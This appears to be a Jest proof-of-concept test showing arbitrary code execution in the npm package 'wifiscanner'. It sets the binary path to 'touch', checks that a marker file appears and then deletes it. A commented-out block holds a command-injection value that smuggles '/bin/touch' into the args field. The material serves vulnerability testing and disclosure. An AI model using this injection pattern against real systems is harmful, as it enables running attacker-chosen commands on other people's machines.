//https://github.com/thingsSDK/wifiscanner/issues/1
test("Arbitrary code execution in wifiscanner", () => {
  const fs = require("fs");
  let wifiscanner = require("wifiscanner");
  const sleep = require("sleep");

  const path = "./wifiscanner.txt";

  let options = {
    args: "./wifiscanner.txt",
    binaryPath: "touch",
  };
  try {
    let scanner = wifiscanner(options);
    scanner.scan(function (error, networks) {
      // if(error) {
      //   console.error(error);
      // } else {
      //   console.dir(networks);
      // }
    });
  } catch (error) {
    console.log(error);
  }

  // let options = {
  //   args: ";/bin/touch wifiscanner;#",
  // };

  // //checking that its not present already
  // file_exist = fs.existsSync(path);
  // expect(file_exist).toBe(false);

  // let scanner = wifiscanner(options);
  // scanner.scan(function (error, networks) {});

  sleep.sleep(2);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
